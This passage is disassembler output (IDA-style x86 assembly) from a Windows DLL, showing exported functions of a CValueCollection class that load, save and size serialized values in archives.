		push	eax
		lea	ecx, [ebp+var_C]
		mov	[edi], ebx
		call	Ordinal1228
		push	2
		lea	ecx, [ebp+var_24]
		call	Ordinal680
		mov	eax, [esi]
		lea	ecx, [ebp+var_24]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+14h]
		test	al, al
		jnz	short loc_6AF37574
		push	offset aCvaluecolle_14 ; "CValueCollection::GetSize() :	SaveArchi"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF37580
; ---------------------------------------------------------------------------

loc_6AF37574:				; CODE XREF: Ordinal293+38j
		lea	ecx, [ebp+var_24]
		call	Ordinal364
		mov	[edi], eax
		mov	bl, 1

loc_6AF37580:				; CODE XREF: Ordinal293+45j
		lea	ecx, [ebp+var_24]
		call	Ordinal681
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal293	endp

; Exported entry 294.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal294
Ordinal294	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	bl, [esi+8]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn
Ordinal294	endp

; Exported entry 295.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal295
Ordinal295	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	al, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+8], al
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal295	endp

; Exported entry 296.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal296
Ordinal296	proc near		; CODE XREF: Ordinal178+2Ap
					; Ordinal217+16p
					; DATA XREF: ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		push	esi
		lea	eax, [ebp+var_4]
		mov	esi, ecx
		mov	ecx, [ebp+arg_0]
		push	eax
		call	Ordinal329
		test	eax, eax
		jnz	short loc_6AF3761A
		push	offset aCvaluecolle_15 ; "CValueCollection::LoadArchive() : Archi"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	short loc_6AF3764A
; ---------------------------------------------------------------------------

loc_6AF3761A:				; CODE XREF: Ordinal296+19j
		mov	eax, [ebp+var_4]
		dec	eax
		push	ebx		; Args
		mov	bl, 1
		jz	short loc_6AF3762A
		push	offset aCvaluecolle_16 ; "CValueCollection::LoadArchive() : switc"...
		jmp	short loc_6AF3763F
; ---------------------------------------------------------------------------

loc_6AF3762A:				; CODE XREF: Ordinal296+31j
		mov	ecx, [ebp+arg_0]
		add	esi, 9
		push	esi
		call	Ordinal317
		test	eax, eax
		jnz	short loc_6AF37647
		push	offset aCvaluecolle_15 ; "CValueCollection::LoadArchive() : Archi"...

loc_6AF3763F:				; CODE XREF: Ordinal296+38j
		call	sub_6AF3102E
		pop	ecx
		xor	bl, bl

loc_6AF37647:				; CODE XREF: Ordinal296+48j
		mov	al, bl
		pop	ebx

loc_6AF3764A:				; CODE XREF: Ordinal296+28j
		pop	esi
		leave
		retn	4
Ordinal296	endp

; Exported entry 297.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal297
Ordinal297	proc near		; CODE XREF: Ordinal179+Cp
					; Ordinal218+Cp
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	ecx, [esp+4+arg_0]
		push	1
		call	Ordinal330
		test	eax, eax
		jz	short loc_6AF37674
		mov	ecx, [esp+4+arg_0]
		xor	eax, eax
		mov	al, [esi+9]
		push	eax
		call	Ordinal318
		test	eax, eax
		jnz	short loc_6AF37683

loc_6AF37674:				; CODE XREF: Ordinal297+10j
		push	offset aCvaluecolle_17 ; "CValueCollection::SaveArchive() : Archi"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	short loc_6AF37685
; ---------------------------------------------------------------------------

loc_6AF37683:				; CODE XREF: Ordinal297+23j
		mov	al, 1

loc_6AF37685:				; CODE XREF: Ordinal297+32j
		pop	esi
		retn	4
Ordinal297	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF37689(LPCWSTR lpWideCharStr)
sub_6AF37689	proc near		; CODE XREF: sub_6AF381EE+Ep

lpWideCharStr	= dword	ptr  4

		xor	eax, eax
		push	eax		; lpUsedDefaultChar
		push	eax		; lpDefaultChar
		push	eax		; cbMultiByte
		push	eax		; lpMultiByteStr
		push	0FFFFFFFFh	; cchWideChar
		push	[esp+14h+lpWideCharStr]	; lpWideCharStr
		push	eax		; dwFlags
		call	Target
		push	eax		; CodePage
		call	ds:WideCharToMultiByte
		dec	eax
		retn
sub_6AF37689	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF376A5(LPCSTR lpMultiByteStr)
sub_6AF376A5	proc near		; CODE XREF: sub_6AF38238+Ep

lpMultiByteStr	= dword	ptr  4

		xor	eax, eax
		push	eax		; cchWideChar
		push	eax		; lpWideCharStr
		push	0FFFFFFFFh	; cbMultiByte
		push	[esp+0Ch+lpMultiByteStr] ; lpMultiByteStr
		push	eax		; dwFlags
		call	Target
		push	eax		; CodePage
		call	ds:MultiByteToWideChar
		dec	eax
		retn
sub_6AF376A5	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF376BF(LPWSTR lpWideCharStr, int cchWideChar, LPCSTR lpMultiByteStr, int cbMultiByte)
sub_6AF376BF	proc near		; CODE XREF: sub_6AF38238+2Bp

lpWideCharStr	= dword	ptr  4
cchWideChar	= dword	ptr  8
lpMultiByteStr	= dword	ptr  0Ch
cbMultiByte	= dword	ptr  10h

		push	[esp+cchWideChar] ; cchWideChar
		push	[esp+4+lpWideCharStr] ;	lpWideCharStr
		push	[esp+8+cbMultiByte] ; cbMultiByte
		push	[esp+0Ch+lpMultiByteStr] ; lpMultiByteStr
		push	0		; dwFlags
		call	Target
		push	eax		; CodePage
		call	ds:MultiByteToWideChar
		retn
sub_6AF376BF	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF376DF	proc near		; CODE XREF: Ordinal301+120p
					; Ordinal341+14Bp

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		cmp	eax, 0FFFFFFFFh
		push	esi
		mov	esi, ecx
		jnz	short loc_6AF376F9
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_6AF376F9
		push	eax		; Str
		call	ds:wcslen
		pop	ecx

loc_6AF376F9:				; CODE XREF: sub_6AF376DF+Aj
					; sub_6AF376DF+10j
		push	eax
		mov	ecx, esi
		call	sub_6AF33456
		pop	esi
		retn	4
sub_6AF376DF	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF37705	proc near		; CODE XREF: sub_6AF378BB+Ap

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	sub_6AF33374
		mov	ecx, [esp+4+arg_0]
		test	ecx, ecx
		jz	short loc_6AF3771F
		mov	eax, [ecx]
		push	esi
		push	offset dword_6AF544BC
		call	dword ptr [eax]

loc_6AF3771F:				; CODE XREF: sub_6AF37705+Ej
		mov	eax, [esi]
		pop	esi
		retn	4
sub_6AF37705	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF37725	proc near		; CODE XREF: sub_6AF38282+24p

arg_0		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+arg_0]
		mov	ecx, [esi]
		mov	eax, [ecx]
		push	edi
		call	dword ptr [eax+10h]
		lea	edx, [esi+0Ch]
		cmp	dword ptr [edx], 0
		jl	short loc_6AF37749
		cmp	eax, [esi]
		jnz	short loc_6AF37749
		xor	eax, eax
		mov	edi, esi
		inc	eax
		lock xadd [edx], eax
		jmp	short loc_6AF3777A
; ---------------------------------------------------------------------------

loc_6AF37749:				; CODE XREF: sub_6AF37725+13j
					; sub_6AF37725+17j
		mov	edx, [eax]
		push	2
		push	dword ptr [esi+4]
		mov	ecx, eax
		call	dword ptr [edx]
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF3775F
		jmp	sub_6AF31583
; ---------------------------------------------------------------------------

loc_6AF3775F:				; CODE XREF: sub_6AF37725+33j
		mov	eax, [esi+4]
		mov	[edi+4], eax
		mov	eax, [esi+4]
		inc	eax
		push	eax		; int
		add	esi, 10h
		lea	eax, [edi+10h]
		push	esi		; Src
		push	eax		; Dst
		call	sub_6AF33425
		add	esp, 0Ch

loc_6AF3777A:				; CODE XREF: sub_6AF37725+22j
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_6AF37725	endp

; Exported entry 249.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal249
Ordinal249	proc near		; CODE XREF: Ordinal260+46p
					; Ordinal300+2Ep
					; DATA XREF: ...
		mov	edx, [ecx+8]
		xor	eax, eax
		cmp	edx, 9
		jg	short loc_6AF377B9
		jz	short loc_6AF377B1
		test	edx, edx
		jle	short locret_6AF377CE
		cmp	edx, 6
		jle	short loc_6AF377C8
		cmp	edx, 7
		jz	short loc_6AF377A9
		cmp	edx, 8
		jnz	short locret_6AF377CE
		mov	eax, [ecx+3Ch]
		mov	eax, [eax-0Ch]
		lea	eax, [eax+eax+2]
		retn
; ---------------------------------------------------------------------------

loc_6AF377A9:				; CODE XREF: Ordinal249+18j
		mov	eax, [ecx+38h]
		mov	eax, [eax-0Ch]
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF377B1:				; CODE XREF: Ordinal249+Aj
		add	ecx, 28h
		jmp	Ordinal236
; ---------------------------------------------------------------------------

loc_6AF377B9:				; CODE XREF: Ordinal249+8j
		cmp	edx, 0Ah
		jz	short loc_6AF377C8
		jle	short locret_6AF377CE
		cmp	edx, 0Ch
		jg	short locret_6AF377CE
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF377C8:				; CODE XREF: Ordinal249+13j
					; Ordinal249+3Dj
		push	edx
		call	Ordinal370

locret_6AF377CE:			; CODE XREF: Ordinal249+Ej
					; Ordinal249+1Dj ...
		retn
Ordinal249	endp

; Exported entry 260.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal260
Ordinal260	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		xor	ebx, ebx
		mov	esi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[edi], ebx
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+arg_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+arg_4], ebx
		call	dword ptr [eax+8]
		test	al, al
		jnz	short loc_6AF37812
		push	offset aCvaluecolle_18 ; "CValueCollection::GetSize() :	GetReadVa"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF3781E
; ---------------------------------------------------------------------------

loc_6AF37812:				; CODE XREF: Ordinal260+34j
		mov	ecx, [ebp+arg_4]
		call	Ordinal249
		mov	[edi], eax
		mov	bl, 1

loc_6AF3781E:				; CODE XREF: Ordinal260+41j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal260	endp

; Exported entry 290.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal290
Ordinal290	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF3786C
		push	offset aCvaluecolle_19 ; "CValueCollection::SetValue(ISymBase) : "...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF37886
; ---------------------------------------------------------------------------

loc_6AF3786C:				; CODE XREF: Ordinal290+2Ej
		mov	ecx, [ebp+var_4]
		push	[ebp+arg_4]
		add	ecx, 40h
		call	sub_6AF334D7
		mov	eax, [ebp+var_4]
		mov	dword ptr [eax+8], 0Ch
		mov	bl, 1

loc_6AF37886:				; CODE XREF: Ordinal290+3Bj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal290	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_6AF37896	proc near		; CODE XREF: Ordinal212+E9p
					; Ordinal299+20Dp ...
		jmp	sub_6AF33374
sub_6AF37896	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3789B	proc near		; CODE XREF: sub_6AF317EBj
					; Ordinal142+3j ...
		mov	ecx, [ecx]
		sub	ecx, 10h
		jmp	sub_6AF3160D
sub_6AF3789B	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF378A5	proc near		; CODE XREF: Ordinal248+19Ap

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		cmp	eax, ecx
		jnz	short loc_6AF378B1
		mov	eax, [ecx]
		jmp	short locret_6AF378B8
; ---------------------------------------------------------------------------

loc_6AF378B1:				; CODE XREF: sub_6AF378A5+6j
		push	dword ptr [eax]
		call	sub_6AF334D7

locret_6AF378B8:			; CODE XREF: sub_6AF378A5+Aj
		retn	4
sub_6AF378A5	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF378BB	proc near		; CODE XREF: Ordinal299+15Bp
					; Ordinal300+125p

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		and	dword ptr [esi], 0
		call	sub_6AF37705
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF378BB	endp

; Exported entry 250.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal250
Ordinal250	proc near		; CODE XREF: Ordinal177+33p
					; Ordinal180+125p ...
		push	ebx
		fldz
		push	esi
		mov	esi, ecx
		lea	eax, [esi+10h]
		xor	ebx, ebx
		mov	[eax], bl
		mov	[eax], bx
		mov	[eax], ebx
		mov	[eax+4], ebx
		fstp	qword ptr [eax]
		mov	[eax], ebx
		lea	eax, [esi+18h]
		push	eax		; pvarg
		call	ds:VariantClear
		lea	ecx, [esi+28h]
		call	Ordinal874
		lea	ecx, [esi+38h]
		call	sub_6AF317A8
		lea	ecx, [esi+3Ch]
		call	sub_6AF33810
		lea	ecx, [esi+40h]
		call	sub_6AF33374
		mov	[esi+44h], bl
		mov	[esi+8], ebx
		pop	esi
		pop	ebx
		retn
Ordinal250	endp

; Exported entry 299.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal299
Ordinal299	proc near		; CODE XREF: Ordinal178+1ACp
					; Ordinal217+AEp
					; DATA XREF: ...

var_34		= dword	ptr -34h
var_30		= byte ptr -30h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_15		= byte ptr -15h
Args		= byte ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		mov	eax, ___security_cookie
		and	[ebp+var_1C], 0
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		push	edi
		mov	edi, [ebp+arg_0]
		mov	[ebp+var_34], ecx
		lea	ebx, [esi+8]
		push	ebx
		mov	ecx, edi
		mov	[ebp+var_4], eax
		mov	[ebp+var_15], 1
		call	Ordinal329
		test	eax, eax
		jz	loc_6AF37B67
		lea	eax, [ebp+var_1C]
		push	eax
		mov	ecx, edi
		call	Ordinal323
		test	eax, eax
		jz	loc_6AF37B67
		mov	ebx, [ebx]
		lea	eax, [ebx-1]	; switch 12 cases
		cmp	eax, 0Bh
		ja	loc_6AF37B4F	; jumptable 6AF37972 default case
		jmp	ds:off_6AF37B88[eax*4] ; switch	jump

loc_6AF37979:				; DATA XREF: .text:off_6AF37B88o
		add	esi, 10h	; jumptable 6AF37972 case 1
		push	esi
		mov	ecx, edi
		call	Ordinal319
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF37989:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		add	esi, 10h	; jumptable 6AF37972 case 2
		push	esi
		mov	ecx, edi
		call	Ordinal321
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF37999:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		add	esi, 10h	; jumptable 6AF37972 case 3
		push	esi
		mov	ecx, edi
		call	Ordinal323
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF379A9:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		add	esi, 10h	; jumptable 6AF37972 case 4
		push	esi
		mov	ecx, edi
		call	Ordinal325
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF379B9:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		add	esi, 10h	; jumptable 6AF37972 case 5
		push	esi
		mov	ecx, edi
		call	Ordinal327
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF379C9:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		add	esi, 10h	; jumptable 6AF37972 case 6
		push	esi
		mov	ecx, edi
		call	Ordinal329
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF379D9:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		add	esi, 38h	; jumptable 6AF37972 case 7
		push	esi
		mov	ecx, edi
		call	Ordinal340
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF379E9:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		add	esi, 3Ch	; jumptable 6AF37972 case 8
		push	esi
		mov	ecx, edi
		call	Ordinal341
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF379F9:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		push	[ebp+var_1C]	; jumptable 6AF37972 case 9
		lea	ecx, [esi+28h]
		push	[ebp+var_1C]
		call	Ordinal870
		push	eax
		mov	ecx, edi
		call	Ordinal331
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF37A14:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		add	esi, 10h	; jumptable 6AF37972 case 10
		push	esi
		mov	ecx, edi
		call	Ordinal317
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF37A24:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		add	esi, 18h	; jumptable 6AF37972 case 11
		push	esi
		mov	ecx, edi
		call	Ordinal342
		jmp	loc_6AF37B5C
; ---------------------------------------------------------------------------

loc_6AF37A34:				; CODE XREF: Ordinal299+56j
					; DATA XREF: .text:off_6AF37B88o
		push	10h		; jumptable 6AF37972 case 12
		lea	eax, [ebp+Args]
		push	eax
		mov	ecx, edi
		call	Ordinal331
		test	eax, eax
		jnz	short loc_6AF37A4F
		push	offset aCvaluecolle_20 ; "CValueCollection::LoadValue()	: Archive"...
		jmp	loc_6AF37B47
; ---------------------------------------------------------------------------

loc_6AF37A4F:				; CODE XREF: Ordinal299+127j
		mov	ecx, [ebp+var_34]
		mov	eax, [ecx]
		add	esi, 40h
		push	esi
		lea	edx, [ebp+Args]
		push	edx		; Args
		call	dword ptr [eax+4]
		test	al, al
		jz	loc_6AF37B42
		mov	esi, [esi]
		xor	ebx, ebx
		cmp	esi, ebx
		jz	loc_6AF37B42
		push	esi
		lea	ecx, [ebp+arg_4]
		call	sub_6AF378BB
		cmp	[ebp+arg_4], ebx
		jnz	short loc_6AF37A91
		push	offset aCvaluecolle_21 ; "CValueCollection::LoadValue()	: pSerial"...

loc_6AF37A86:				; CODE XREF: Ordinal299+18Cj
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF37B26
; ---------------------------------------------------------------------------

loc_6AF37A91:				; CODE XREF: Ordinal299+163j
		lea	eax, [ebp+arg_0]
		push	eax
		mov	ecx, edi
		mov	[ebp+arg_0], ebx
		call	Ordinal314
		test	eax, eax
		jnz	short loc_6AF37AAA
		push	offset aCvaluecolle_22 ; "CValueCollection::LoadValue()	: Archive"...
		jmp	short loc_6AF37A86
; ---------------------------------------------------------------------------

loc_6AF37AAA:				; CODE XREF: Ordinal299+185j
		lea	ecx, [ebp+var_30]
		call	Ordinal861
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_30]
		call	Ordinal870
		test	eax, eax
		jnz	short loc_6AF37AC8
		push	offset aCvaluecolle_23 ; "CValueCollection::LoadValue()	: mem.New"...
		jmp	short loc_6AF37B18
; ---------------------------------------------------------------------------

loc_6AF37AC8:				; CODE XREF: Ordinal299+1A3j
		lea	eax, [ebp+var_20]
		push	eax
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_30]
		mov	[ebp+var_20], ebx
		call	Ordinal865
		push	eax
		mov	ecx, edi
		call	Ordinal332
		test	eax, eax
		jnz	short loc_6AF37AED
		push	offset aCvaluecolle_20 ; "CValueCollection::LoadValue()	: Archive"...
		jmp	short loc_6AF37B18
; ---------------------------------------------------------------------------

loc_6AF37AED:				; CODE XREF: Ordinal299+1C8j
		mov	eax, [ebp+arg_4]
		mov	edi, [eax]
		mov	esi, eax
		lea	eax, [ebp+var_20]
		push	eax
		lea	ecx, [ebp+var_30]
		call	Ordinal236
		push	eax
		lea	ecx, [ebp+var_30]
		call	Ordinal865
		push	eax		; Args
		mov	ecx, esi
		call	dword ptr [edi+10h]
		test	al, al
		jnz	short loc_6AF37B30
		push	offset aCvaluecolle_24 ; "CValueCollection::LoadValue()	: pSerial"...

loc_6AF37B18:				; CODE XREF: Ordinal299+1AAj
					; Ordinal299+1CFj
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_30]
		call	Ordinal863

loc_6AF37B26:				; CODE XREF: Ordinal299+170j
		lea	ecx, [ebp+arg_4]
		call	sub_6AF37896
		jmp	short loc_6AF37B60
; ---------------------------------------------------------------------------

loc_6AF37B30:				; CODE XREF: Ordinal299+1F5j
		lea	ecx, [ebp+var_30]
		call	Ordinal863
		lea	ecx, [ebp+arg_4]
		call	sub_6AF37896
		jmp	short loc_6AF37B76
; ---------------------------------------------------------------------------

loc_6AF37B42:				; CODE XREF: Ordinal299+145j
					; Ordinal299+151j
		push	offset aCvaluecolle_25 ; "CValueCollection::LoadValue()	: CreateO"...

loc_6AF37B47:				; CODE XREF: Ordinal299+12Ej
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF37B60
; ---------------------------------------------------------------------------

loc_6AF37B4F:				; CODE XREF: Ordinal299+50j
		push	offset aCvaluecolle_26 ; jumptable 6AF37972 default case
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF37B5C:				; CODE XREF: Ordinal299+68j
					; Ordinal299+78j ...
		test	eax, eax
		jnz	short loc_6AF37B76

loc_6AF37B60:				; CODE XREF: Ordinal299+212j
					; Ordinal299+231j
		push	offset aCvaluecolle_27 ; "CValueCollection::LoadValue()	: bArchiv"...
		jmp	short loc_6AF37B6C
; ---------------------------------------------------------------------------

loc_6AF37B67:				; CODE XREF: Ordinal299+2Fj
					; Ordinal299+42j
		push	offset aCvaluecolle_20 ; "CValueCollection::LoadValue()	: Archive"...

loc_6AF37B6C:				; CODE XREF: Ordinal299+249j
		call	sub_6AF3102E
		pop	ecx
		mov	[ebp+var_15], 0

loc_6AF37B76:				; CODE XREF: Ordinal299+224j
					; Ordinal299+242j
		mov	ecx, [ebp+var_4]
		mov	al, [ebp+var_15]
		pop	edi
		pop	esi
		pop	ebx
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	8
Ordinal299	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
off_6AF37B88	dd offset loc_6AF37979	; DATA XREF: Ordinal299+56r
		dd offset loc_6AF37989	; jump table for switch	statement
		dd offset loc_6AF37999
		dd offset loc_6AF379A9
		dd offset loc_6AF379B9
		dd offset loc_6AF379C9
		dd offset loc_6AF379D9
		dd offset loc_6AF379E9
		dd offset loc_6AF379F9
		dd offset loc_6AF37A14
		dd offset loc_6AF37A24
		dd offset loc_6AF37A34
; Exported entry 300.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal300
Ordinal300	proc near		; CODE XREF: Ordinal179+7Cp
					; Ordinal218+6Fp
					; DATA XREF: ...

var_3C		= qword	ptr -3Ch
var_2C		= byte ptr -2Ch
var_1C		= dword	ptr -1Ch
var_15		= byte ptr -15h
var_14		= byte ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		mov	eax, ___security_cookie
		push	esi
		mov	esi, [ebp+arg_4]
		push	edi
		mov	edi, [ebp+arg_0]
		push	dword ptr [esi+8]
		mov	ecx, edi
		mov	[ebp+var_4], eax
		mov	[ebp+var_15], 1
		call	Ordinal330
		test	eax, eax
		jz	loc_6AF37DEF
		mov	ecx, esi
		call	Ordinal249
		push	eax
		mov	ecx, edi
		call	Ordinal324
		test	eax, eax
		jz	loc_6AF37DEF
		mov	eax, [esi+8]
		dec	eax
		cmp	eax, 0Bh	; switch 12 cases
		ja	loc_6AF37DD7	; jumptable 6AF37C08 default case
		jmp	ds:off_6AF37E0F[eax*4] ; switch	jump

loc_6AF37C0F:				; DATA XREF: .text:off_6AF37E0Fo
		xor	eax, eax	; jumptable 6AF37C08 case 0
		mov	al, [esi+10h]
		mov	ecx, edi
		push	eax
		call	Ordinal320
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37C21:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		xor	eax, eax	; jumptable 6AF37C08 case 1
		mov	ax, [esi+10h]
		mov	ecx, edi
		push	eax
		call	Ordinal322
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37C34:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		push	dword ptr [esi+10h] ; jumptable	6AF37C08 case 2
		mov	ecx, edi
		call	Ordinal324
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37C43:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		push	dword ptr [esi+14h] ; jumptable	6AF37C08 case 3
		mov	ecx, edi
		push	dword ptr [esi+10h]
		call	Ordinal326
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37C55:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		fld	qword ptr [esi+10h] ; jumptable	6AF37C08 case 4
		push	ecx
		push	ecx
		mov	ecx, edi
		fstp	[esp+3Ch+var_3C]
		call	Ordinal328
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37C69:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		push	dword ptr [esi+10h] ; jumptable	6AF37C08 case 5
		mov	ecx, edi
		call	Ordinal330
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37C78:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		push	dword ptr [esi+38h] ; jumptable	6AF37C08 case 6
		mov	ecx, edi
		call	Ordinal336
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37C87:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		push	dword ptr [esi+3Ch] ; jumptable	6AF37C08 case 7
		mov	ecx, edi
		call	Ordinal339
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37C96:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		add	esi, 28h	; jumptable 6AF37C08 case 8
		mov	ecx, esi
		call	Ordinal236
		push	eax
		mov	ecx, esi
		call	Ordinal865
		push	eax
		mov	ecx, edi
		call	Ordinal333
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37CB5:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		xor	eax, eax	; jumptable 6AF37C08 case 9
		mov	al, [esi+10h]
		mov	ecx, edi
		push	eax
		call	Ordinal318
		jmp	loc_6AF37DE4
